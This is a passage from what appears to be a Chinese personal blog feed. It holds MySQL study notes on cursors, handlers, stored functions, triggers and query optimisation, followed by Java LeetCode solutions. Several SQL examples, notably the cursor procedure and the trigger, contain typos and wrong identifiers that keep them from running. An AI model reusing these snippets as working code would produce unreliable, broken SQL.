loop</span><br><span class="line">sql..</span><br><span class="line">end loop;[end_label];</span><br></pre></td></tr></table></figure><p>前后两个是标记</p><p>实例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> p(<span class="keyword">IN</span> n <span class="type">INT</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">DECLARE</span> total <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    sum_loop: LOOP</span><br><span class="line">        IF n <span class="operator">&lt;=</span> <span class="number">0</span> <span class="keyword">THEN</span></span><br><span class="line">            LEAVE sum_loop;</span><br><span class="line">        <span class="keyword">END</span> IF;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">SET</span> total :<span class="operator">=</span> total <span class="operator">+</span> n;</span><br><span class="line">        <span class="keyword">SET</span> n :<span class="operator">=</span> n <span class="operator">-</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">END</span> LOOP sum_loop;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">SELECT</span> total;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="游标">游标</h3><p>存储查询结果集的数据类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare 游标名称 cursor for 查询语句；</span><br></pre></td></tr></table></figure><p>打开游标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open 游标名称</span><br></pre></td></tr></table></figure><p>获取游标记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch 游标名称 into 变量；</span><br></pre></td></tr></table></figure><p>关闭游标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">close 游标名称；</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> p(<span class="keyword">in</span> uage <span class="type">int</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">declare</span> uname <span class="type">varchar</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">declare</span> upro <span class="type">varchar</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">declare</span> u_cursor <span class="keyword">cursor</span> <span class="keyword">for</span> <span class="keyword">select</span> name,pro <span class="keyword">from</span> tb_user <span class="keyword">where</span> age<span class="operator">&lt;=</span>uage;</span><br><span class="line"><span class="keyword">declare</span> exit hander <span class="keyword">for</span> <span class="keyword">SQLSTATE</span> <span class="string">&#x27;02000&#x27;</span> <span class="keyword">close</span> u_cursor;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> if <span class="keyword">not</span> <span class="keyword">exists</span> tb_user_pro(</span><br><span class="line">id <span class="type">int</span> <span class="keyword">primary</span> key auto _increment.</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">100</span>),</span><br><span class="line">pro <span class="type">varchar</span>(<span class="number">100</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">open</span> u_cuisor;</span><br><span class="line">whlie <span class="literal">true</span> do</span><br><span class="line"><span class="keyword">fetch</span> u_user <span class="keyword">into</span> uname ,upro</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user_pro <span class="keyword">values</span>(<span class="keyword">null</span>,uname,upro);</span><br><span class="line"><span class="keyword">end</span> while;</span><br><span class="line"><span class="keyword">close</span> u_cursor;</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">call</span> p(<span class="number">40</span>);</span><br></pre></td></tr></table></figure><p>SQLSTATE ‘状态码’</p><p>SQL WARNING 以01开头所有状态码简写</p><p>NOT FOUND 02开头的所有状态码简写</p><p>SQLEXCEPTION 所有没有被前面两个状态码的简写</p><h3 id="条件处理程序">条件处理程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DECLARE hanller_action HANDLER FOR condition_value .....sql...;</span><br></pre></td></tr></table></figure><ul><li><p>handler_action:</p><ul><li>continue继续执行</li><li>exit终止</li></ul></li><li><p>condittion_value:</p><ul><li>SQLSTATE ‘状态码’</li><li>SQL WARNING 以01开头所有状态码简写</li><li>NOT FOUND 02开头的所有状态码简写</li><li>SQLEXCEPTION 所有没有被前面两个状态码的简写</li></ul><p>实例：</p><p>在遇到0200的时候会关闭游标，然后退出程序</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare exit handler for SQLSTATE &#x27;0200&#x27; CLOSE u_USERS;</span><br></pre></td></tr></table></figure><h3 id="存储函数">存储函数</h3><p>是有返回值的存储过程，必须是类型的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create function test()</span><br><span class="line">returns type [characteristic]</span><br><span class="line">begin</span><br><span class="line">sql....</span><br><span class="line">reurn...</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p>其中characteristic:</p><ul><li>DETERMINISTIC 相同的参数总是产生相同的结果</li><li>no sql 不包含sql语句</li><li>reads sql data 包含读取数据的语句，但不包含写入数据的语句</li></ul><p>从1累加到n的存储函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create function fun(n int)</span><br><span class="line">returns int deterministic </span><br><span class="line">begin</span><br><span class="line">declare total int default 0;</span><br><span class="line">        while n &gt;0 do</span><br><span class="line">              set total :=total + n;</span><br><span class="line">              set n := n-1;</span><br><span class="line">        end while;</span><br><span class="line">        return total;</span><br><span class="line">end;</span><br><span class="line">select fun(100);</span><br></pre></td></tr></table></figure><h2 id="触发器">触发器</h2><p>与数据库表有关的数据库对象，在删除插入更新数据的之前之后都可以触发触发器</p><p>就可以在数据库端进行保存数据的完整性日志数据校验等工作</p><p>old和new来引用触发器</p><ul><li>insert —new</li><li>update–old–new</li><li>delete—old</li></ul><p>现在只支持行级触发器，不支持语句触发器。</p><p>创建触发器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create trigger name</span><br><span class="line">    before /after insert/update/delete</span><br><span class="line">    on tab_name for each row//行级触发器</span><br><span class="line">    begin</span><br><span class="line">    sql...</span><br><span class="line">    end;</span><br></pre></td></tr></table></figure><p>查看触发器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show triggers;</span><br></pre></td></tr></table></figure><p>删除触发器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop tigger [date_name]tigger_name;</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create trigger ta_user_insert_tigger</span><br><span class="line">    after insert on tb_user for each row </span><br><span class="line">    begin </span><br><span class="line">        insert into user_logs(..............) values;</span><br><span class="line">        (null,&#x27;insert&#x27;,now(),new.id,concat(&#x27;插入的数据内容为&#x27;+id+&#x27;name=&#x27;+new.name));</span><br><span class="line">    end;</span><br></pre></td></tr></table></figure><p>小结</p><p>视图是一个虚拟存在的表，不保存查询结果。数据独立，数据安全。</p>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql sql优化</title>
      <link href="/2024/07/31/mysql9/"/>
      <url>/2024/07/31/mysql9/</url>
      
        <content type="html"><![CDATA[<h1>Sql优化</h1><h2 id="插入数据">插入数据</h2><p>批量插入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into tb_name values(1,&#x27;a&#x27;),(2,&#x27;b&#x27;),(3,&#x27;c&#x27;);</span><br></pre></td></tr></table></figure><p>不要超过1k条，多的进入sql语句查询</p><p>手动提交：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start transaction;</span><br><span class="line">insert into tb_name values(1,&#x27;a&#x27;),(2,&#x27;b&#x27;),(3,&#x27;c&#x27;);</span><br><span class="line">insert into tb_name values(1,&#x27;a&#x27;),(2,&#x27;b&#x27;),(3,&#x27;c&#x27;);</span><br><span class="line">insert into tb_name values(1,&#x27;a&#x27;),(2,&#x27;b&#x27;),(3,&#x27;c&#x27;);</span><br><span class="line">insert into tb_name values(1,&#x27;a&#x27;),(2,&#x27;b&#x27;),(3,&#x27;c&#x27;);</span><br><span class="line">commit;</span><br></pre></td></tr></table></figure><p>所有的事务完成后，再提交数据</p><p>主键顺序插入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>大量数据插入使用load</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">先连接上mysql数据库</span><br><span class="line">mysql --local-infile -u root -p</span><br><span class="line">设置全局参数，开启本地文件加载</span><br><span class="line">set global local_infile = 1;</span><br><span class="line">执行load指令</span><br><span class="line">load date local infile &#x27;/root/sql1.log&#x27; into table &#x27;tb_user&#x27; fields terminated by &#x27;,&#x27; lines terminated by &#x27;\n&#x27;;</span><br></pre></td></tr></table></figure><p>sql数据在log日志文件里</p><h2 id="主键优化">主键优化</h2><p>在innodb存储引擎中，表数据都是根据主键顺序组织存放的</p><p>一个区中包含64个页</p><p>页中存放的是具体的行数据，至少包含两行数据（数据过大，会行溢出）</p><p>顺序插入：</p><p>一个页满了，去写下一个页，他们之间会有一个双向指针</p><p>乱序插入：</p><p>会出现页分裂现象</p><p>页合并：</p><p>在删除一行数据的时候，不会真正的删除，只会记录标记</p><p>当记录达到merge_threshold（默认页的百分之五十）的时候，会找相邻的两个页是不是能够合并</p><p>主键的设计原则：</p><ul><li>尽量降低主键的长度</li><li>插入数据时尽量选择顺序插入，选择使用auto_incerment</li><li>尽量不要使用uuid做主键或者其他自然主键，如身份证号</li></ul><h2 id="order-by优化">order by优化</h2><p>用using index的效率比较高，所以尽量用这个方式</p><p>backward index scan反向扫描索引，是desc进行排序的结果</p><p>创建索引的时候默认是升序排列，如果排序的时候用倒序，则会出现额外的排序</p><p>要创建新的索引</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create index idx_user_age_pho_ad on ta_user(age asc,phone desc);</span><br></pre></td></tr></table></figure><p>这样查询的时候age asc phone desc排序就不会出现filesort了</p><p>原则：</p><ul><li>尽量使用覆盖索引</li><li>多字段排序的时候，要注意联合索引的升降序</li><li>如果出现filesort，大数据排序的时候，可是适当增大缓冲区的大小sort_buffer_size</li><li>要建立合适的索引，多字段排序的时候，也遵循最左前缀法则</li></ul><h2 id="group-by优化">group by优化</h2><p>索引对分组操作的影响：</p><p>尽量分组的时候要走索引的时候才能进行sql优化。</p><p>索引的使用也要满足最左前缀法则</p><h2 id="limit-优化">limit 优化</h2><p>大数据下limit的优化</p><p>越往后性能越低，查询排序的条件非常大</p><p>在in之后不能使用limit语句</p><p>但可以使用多表联查，其中一个表为子查询。注意where条件和return数据</p><h2 id="count优化">count优化</h2><p>count优化只能自己优化，大数据量的情况下比较耗时</p><p>count</p><p>是一个聚合函数，如果不是null则计数加一</p><p>count(*) count(主键) count(字段列表) count(null) count(1)</p><p>count(字段)：</p><ul><li>没有not null约束的话，需要把字段值提取出来，在服务层进行判断，然后进行计数</li><li>有not null约束的话，会直接返回服务层，再进行累加</li></ul><p><strong>sql性能：count(*)&gt;count(1)&gt;count(主键 id)&gt;count(字段)</strong></p><h2 id="update优化">update优化</h2><p>更新的字段没有索引，会锁住表</p><p>有索引的话，只会锁住行</p><p>行锁是对于索引进行加的锁，不要出现表锁，否则并发性能就会下降</p>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA 练习</title>
      <link href="/2024/07/28/javatest/"/>
      <url>/2024/07/28/javatest/</url>
      
        <content type="html"><![CDATA[<h1>java编程练习</h1><h2 id="基础题">基础题</h2><h3 id="1-leetcode-回文数">1.leetcode <a href="https://leetcode.cn/problems/palindrome-number/"> 回文数</a></h3><p>给你一个整数 <code>x</code> ，如果 <code>x</code> 是一个回文整数，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p><p>回文数</p><p>是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p><ul><li>例如，<code>121</code> 是回文，而 <code>123</code> 不是。</li></ul><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x = 121</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：x = -121</span><br><span class="line">输出：false</span><br><span class="line">解释：从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：x = 10</span><br><span class="line">输出：false</span><br><span class="line">解释：从右向左读, 为 01 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>-231 &lt;= x &lt;= 231 - 1</code></li></ul><p>题解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public boolean isPalindrome(int x) &#123;</span><br><span class="line">        if(x&lt;0) return false;</span><br><span class="line">        int t = x;</span><br><span class="line">        int y = 0;</span><br><span class="line">        while(t&gt;0)&#123;</span><br><span class="line">            y = y * 10 + t % 10;</span><br><span class="line">            t /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        return x == y;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>循环条件</strong>：<code>while(t &gt; 0)</code> 表示只要 <code>t</code> 大于 <code>0</code>，就继续循环。即，只要还有未处理的数字，就继续反转。</p><p><strong>反转步骤</strong>：</p><ul><li><strong>取个位数字</strong>：<code>t % 10</code> 取 <code>t</code> 的最后一位数字。例如，如果 <code>t</code> 是 <code>1234</code>，<code>t % 10</code> 会得到 <code>4</code>。</li><li><strong>构建反转后的数字</strong>：<code>y = y * 10 + t % 10</code> 将当前的 <code>y</code> 向左移动一位（乘以 <code>10</code>），然后加上取出的最后一位数字。这一步的效果是把 <code>t</code> 的最后一位数字移到 <code>y</code> 的末尾。例如，如果 <code>y</code> 是 <code>123</code>，<code>t % 10</code> 是 <code>4</code>，那么 <code>y = y * 10 + t % 10</code> 就会变成 <code>1234</code>。</li><li><strong>移除已处理的位</strong>：<code>t /= 10</code> 将 <code>t</code> 除以 <code>10</code>，即移除 <code>t</code> 的最后一位。例如，如果 <code>t</code> 是 <code>1234</code>，<code>t /= 10</code> 会把 <code>t</code> 变成 <code>123</code>。</li></ul><h3 id="2-leetcode-罗马数字转整数">2.leetcode <a href="https://leetcode.cn/problems/roman-to-integer/">罗马数字转整数</a></h3><p>罗马数字包含以下七种字符: <code>I</code>， <code>V</code>， <code>X</code>， <code>L</code>，<code>C</code>，<code>D</code> 和 <code>M</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">字符          数值</span><br><span class="line">I             1</span><br><span class="line">V             5</span><br><span class="line">X             10</span><br><span class="line">L             50</span><br><span class="line">C             100</span><br><span class="line">D             500</span><br><span class="line">M             1000</span><br></pre></td></tr></table></figure><p>例如， 罗马数字 <code>2</code> 写做 <code>II</code> ，即为两个并列的 1 。<code>12</code> 写做 <code>XII</code> ，即为 <code>X</code> + <code>II</code> 。 <code>27</code> 写做 <code>XXVII</code>, 即为 <code>XX</code> + <code>V</code> + <code>II</code> 。</p><p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 <code>IIII</code>，而是 <code>IV</code>。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 <code>IX</code>。这个特殊的规则只适用于以下六种情况：</p><ul><li><code>I</code> 可以放在 <code>V</code> (5) 和 <code>X</code> (10) 的左边，来表示 4 和 9。</li><li><code>X</code> 可以放在 <code>L</code> (50) 和 <code>C</code> (100) 的左边，来表示 40 和 90。</li><li><code>C</code> 可以放在 <code>D</code> (500) 和 <code>M</code> (1000) 的左边，来表示 400 和 900。</li></ul><p>给定一个罗马数字，将其转换成整数。</p><p><strong>示例 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: s = &quot;III&quot;</span><br><span class="line">输出: 3</span><br></pre></td></tr></table></figure><p><strong>示例 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: s = &quot;IV&quot;</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure><p><strong>示例 3:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: s = &quot;IX&quot;</span><br><span class="line">输出: 9</span><br></pre></td></tr></table></figure><p><strong>示例 4:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: s = &quot;LVIII&quot;</span><br><span class="line">输出: 58</span><br><span class="line">解释: L = 50, V= 5, III = 3.</span><br></pre></td></tr></table></figure><p><strong>示例 5:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: s = &quot;MCMXCIV&quot;</span><br><span class="line">输出: 1994</span><br><span class="line">解释: M = 1000, CM = 900, XC = 90, IV = 4.</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= s.length &lt;= 15</code></li><li><code>s</code> 仅含字符 <code>('I', 'V', 'X', 'L', 'C', 'D', 'M')</code></li><li>题目数据保证 <code>s</code> 是一个有效的罗马数字，且表示整数在范围 <code>[1, 3999]</code> 内</li><li>题目所给测试用例皆符合罗马数字书写规则，不会出现跨位等情况。</li><li>IL 和 IM 这样的例子并不符合题目要求，49 应该写作 XLIX，999 应该写作 CMXCIX 。</li><li>关于罗马数字的详尽书写规则，可以参考 <a href="https://baike.baidu.com/item/%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97/772296">罗马数字 - 百度百科</a>。</li></ul><p>题解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">class Solution &#123;</span><br><span class="line">    public int romanToInt(String s) &#123;</span><br><span class="line">        int sum = 0;</span><br><span class="line">        int preNum = getValue(s.charAt(0));</span><br><span class="line">        for(int i = 1;i &lt; s.length(); i ++) &#123;</span><br><span class="line">            int num = getValue(s.charAt(i));</span><br><span class="line">            if(preNum &lt; num) &#123;</span><br><span class="line">                sum -= preNum;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                sum += preNum;</span><br><span class="line">            &#125;</span><br><span class="line">            preNum = num;</span><br><span class="line">        &#125;</span><br><span class="line">        sum += preNum;</span><br><span class="line">        return sum;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private int getValue(char ch) &#123;</span><br><span class="line">        switch(ch) &#123;</span><br><span class="line">            case &#x27;I&#x27;: return 1;</span><br><span class="line">            case &#x27;V&#x27;: return 5;</span><br><span class="line">            case &#x27;X&#x27;: return 10;</span><br><span class="line">            case &#x27;L&#x27;: return 50;</span><br><span class="line">            case &#x27;C&#x27;: return 100;</span><br><span class="line">            case &#x27;D&#x27;: return 500;</span><br><span class="line">            case &#x27;M&#x27;: return 1000;</span><br><span class="line">            default: return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-最长公共前缀">3.<a href="https://leetcode.cn/problems/longest-common-prefix/">最长公共前缀</a></h3><p>编写一个函数来查找字符串数组中的最长公共前缀。</p><p>如果不存在公共前缀，返回空字符串 <code>&quot;&quot;</code>。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：strs = [&quot;flower&quot;,&quot;flow&quot;,&quot;flight&quot;]</span><br><span class="line">输出：&quot;fl&quot;</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：strs = [&quot;dog&quot;,&quot;racecar&quot;,&quot;car&quot;]</span><br><span class="line">输出：&quot;&quot;</span><br><span class="line">解释：输入不存在公共前缀。</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= strs.length &lt;= 200</code></li><li><code>0 &lt;= strs[i].length &lt;= 200</code></li><li><code>strs[i]</code> 仅由小写英文字母组成</li></ul><p>题解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution1</span> &#123;</span><br><span class="line">    <span class="comment">// 方法：找到字符串数组中最长的公共前缀</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">longestCommonPrefix</span><span class="params">(String[] strs)</span> &#123;</span><br><span class="line">        <span class="comment">// 如果输入数组为空，直接返回空字符串</span></span><br><span class="line">        <span class="keyword">if</span> (strs.length == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>; <span class="comment">// 没有字符的空情况，其字符的长度为0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化前缀字符串为第一个字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ans</span> <span class="operator">=</span> strs[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从第二个字符串开始遍历数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; strs.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 在当前字符串和前缀字符串中逐字符比较，直到遇到不同字符或者到达其中一个字符串的末尾</span></span><br><span class="line">            <span class="keyword">for</span> (; j &lt; ans.length() &amp;&amp; j &lt; strs[i].length(); j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (ans.charAt(j) != strs[i].charAt(j))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 更新前缀字符串为当前比较结果的前缀部分</span></span><br><span class="line">            ans = ans.substring(<span class="number">0</span>, j);</span><br><span class="line">            <span class="comment">// 如果前缀字符串为空，直接返回空字符串</span></span><br><span class="line">            <span class="keyword">if</span> (ans.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">                <span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 返回最终的最长公共前缀</span></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主方法，用于测试和验证</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Solution1</span> <span class="variable">solution</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Solution1</span>();</span><br><span class="line">        <span class="comment">// 示例字符串数组</span></span><br><span class="line">        String[] strs = &#123;<span class="string">&quot;flower&quot;</span>, <span class="string">&quot;flow&quot;</span>, <span class="string">&quot;flight&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">// 输出最长公共前缀</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Longest common prefix: &quot;</span> + solution.longestCommonPrefix(strs));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-leetcode删除有序数组中的重复项">4.leetcode<a href="https://leetcode.cn/problems/remove-duplicates-from-sorted-array/">删除有序数组中的重复项</a></h3><p>给你一个 <strong>非严格递增排列</strong> 的数组 <code>nums</code> ，请你**<a href="http://baike.baidu.com/item/%E5%8E%9F%E5%9C%B0%E7%AE%97%E6%B3%95"> 原地</a>** 删除重复出现的元素，使每个元素 <strong>只出现一次</strong> ，返回删除后数组的新长度。元素的 <strong>相对顺序</strong> 应该保持 <strong>一致</strong> 。然后返回 <code>nums</code> 中唯一元素的个数。</p><p>考虑 <code>nums</code> 的唯一元素的数量为 <code>k</code> 